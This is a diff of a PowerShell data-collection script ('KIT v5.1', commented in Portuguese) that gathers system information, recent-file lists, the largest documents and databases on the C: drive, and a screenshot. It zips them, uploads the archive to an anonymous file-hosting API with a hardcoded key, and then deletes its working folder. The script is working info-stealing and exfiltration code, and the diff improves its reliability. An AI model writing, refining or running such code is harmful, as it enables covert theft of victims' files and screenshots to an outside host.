@@ -1,6 +1,5 @@
-# ----------
-# KIT v5 – AnonFiles Edition, top 10 arquivos apenas
-# ----------
+# ---------- KIT v5.1 – ZIP sem corrupção ----------
+$ErrorActionPreference = "Stop"
 $kit     = "$env:TEMP\kit"
 $key     = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
 $upUrl   = "https://api.anonfilesnew.com/upload?key=$key&pretty=true"
@@ -12,6 +11,7 @@ function Write-Log ($msg) {
 }
 
 Write-Log "[START] KIT iniciado em $env:COMPUTERNAME\$env:USERNAME"
+New-Item -ItemType Directory -Path $kit -Force | Out-Null
 
 # 1) Sistema & HW
 Write-Log "[INFO] Coletando sistema e hardware..."
@@ -58,31 +58,32 @@ Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" |
     Select Name,LastWriteTime |
     Out-File "$kit\recent.txt" -Encoding UTF8
 
-# 8) TOP 10 arquivos (apenas nomes e tamanho)
+# 8) TOP 10 arquivos
 Write-Log "[INFO] Buscando top 10 arquivos maiores em C:\ (profundidade 2)..."
 $exts = @("*.pdf","*.doc*","*.xls*","*.txt","*.csv","*.db","*.sqlite","*.pst")
 Get-ChildItem C:\ -Include $exts -Recurse -Depth 2 -EA SilentlyContinue |
     Sort Length -Descending |
     Select -First 10 FullName,Length,LastWriteTime |
     Export-Csv "$kit\top10.csv" -NoTypeInformation
-Write-Log "[INFO] Top 10 salvo em top10.csv"
 
-# 9) Screenshot
+# 9) Screenshot (handle liberado)
 Write-Log "[INFO] Tirando screenshot..."
 Add-Type -AssemblyName System.Windows.Forms
 $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-$bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+$bmp = New-Object System.Drawing.Bitmap($screen.Width,$screen.Height)
 $g = [System.Drawing.Graphics]::FromImage($bmp)
 $g.CopyFromScreen(0,0,0,0,$bmp.Size)
 $pathSS = "$kit\screenshot.jpg"
-$bmp.Save($pathSS, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+$bmp.Save($pathSS,[System.Drawing.Imaging.ImageFormat]::Jpeg)
 $g.Dispose(); $bmp.Dispose()
+[System.GC]::Collect(); Start-Sleep -Milliseconds 200
 
-# 10) Compacta
+# 10) Compactação sem corrupção
 Write-Log "[INFO] Compactando pacote..."
 $zip = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
-Compress-Archive -Path "$kit\*" -Destination $zip -Force
-Write-Log "[ZIP] Criado: $zip ($(Get-Item $zip).Length) bytes"
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+[System.IO.Compression.ZipFile]::CreateFromDirectory($kit,$zip,'Optimal',$false)
+Write-Log "[ZIP] Criado: $zip ($(Get-Item $zip).Length) bytes)"
 
 # 11) Upload AnonFiles
 Write-Log "[UP] Enviando para AnonFiles..."
@@ -98,7 +99,7 @@ try {
     Write-Log "[ERRO] Exceção no upload: $_"
 }
 
-# 12) Limpa
+# 12) Limpeza
 Write-Log "[CLEAN] Removendo pasta temporária..."
 Remove-Item $kit -Recurse -Force
 Write-Log "[END] KIT finalizado. Log completo em $logFile"
